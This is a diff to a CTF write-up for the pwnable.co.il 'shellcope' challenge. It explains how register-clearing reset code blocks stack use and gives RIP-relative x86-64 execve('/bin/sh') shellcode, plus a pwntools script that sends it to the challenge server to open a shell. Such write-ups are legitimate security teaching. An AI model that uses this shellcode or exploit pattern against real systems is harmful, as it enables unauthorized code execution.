@@ -42,44 +42,93 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-`reset_shellcodes` points to a sequence of opcodes stored in the `.data` section:
-
-[![static symbols](/assets/images/ctf-writeups/pwnable.co.il/shellcope/reset_shellcodes_dump.png)](/assets/images/ctf-writeups/pwnable.co.il/shellcope/reset_shellcodes_dump.png)
-
-The main function maps a 0x1000 bytes (page size - 4096 in decimal) using `mmap()`, copies the predefined opcodes from `reset_shellcodes` into that page using `strcpy()`, 
+`reset_shellcodes` points to a sequence of opcodes stored in the `.data` section, the main function maps a 0x1000 bytes (page size - 4096 in decimal) using `mmap()`, copies the predefined opcodes from `reset_shellcodes` into that page using `strcpy()`, 
 then reads up to `4047` bytes from `stdin` into the page starting at offset 48 (appending the user provided instructions). 
 It then calls `mprotect()` to set the page permissions to `read + execute` and finally jumps to the mapped page to run the combined shellcodes.
 
+
+[![static symbols](/assets/images/ctf-writeups/pwnable.co.il/shellcope/reset_shellcodes_dump.png)](/assets/images/ctf-writeups/pwnable.co.il/shellcope/reset_shellcodes_dump.png)
+
+This code clears all the registers, including the stack registers `RBP` and `RSP`. 
+That makes implementing a `shell-spawning` shellcode harder, because we cant use the stack to hold the string `"/bin/sh"`.
+
+One way around this is to embed the `"/bin/sh"` string inside the shellcode itself and use the `RIP` register (which isnt cleared by the XOR) as a pointer to that string.
+
+### Non-stack based shellcode
+```asm
+jmp code
+
+shell:
+    .ascii "/bin/sh\\x00"     
+
+code:         
+    lea rdi, [rip+shell]     
+    mov al, 0x3b             
+    syscall  
+```
+
+This shellcode loads the address of `"/bin/sh"` into `RDI`, sets `AL` to `0x3b` (the execve syscall), and then makes the syscall.
+
 ## Exploit
 ```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 from pwn import *
 
+exe = context.binary = ELF(args.EXE or './shellcope')
+
+### config ###
+host = args.HOST or 'pwnable.co.il'
+port = int(args.PORT or 9001)
+
+### defines ###
+shellcode = """
+jmp code
+
+shell:
+    .ascii "/bin/sh\\x00"     
+
+code:
+    lea rdi, [rip+shell]     
+    mov al, 0x3b             
+    syscall               
+"""
+
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+# -- Exploit goes here --
 def main():
-    ### context ###
-    context.arch = 'amd64'  # Ensure 64-bit architecture
-
     ### run ###
-    #p = process("./shellcope")
-    p = remote("pwnable.co.il", 9001)
+    io = start()
+    
+    log.info("sending shellcode...")
+    io.sendline(asm(shellcode))
 
-    ### payload start ###
-    shellcode = """
-    jmp code
-
-    shell:
-        .ascii "/bin/sh\\x00"     
-
-    code:
-        xor rsi, rsi          
-        xor rdx, rdx             
-        lea rdi, [rip+shell]     
-        mov al, 0x3b             
-        syscall               
-    """
-
-    payload = asm(shellcode)
-    p.sendline(payload)
-    p.interactive()
+    io.interactive()
 
 if __name__ == "__main__":
     main()
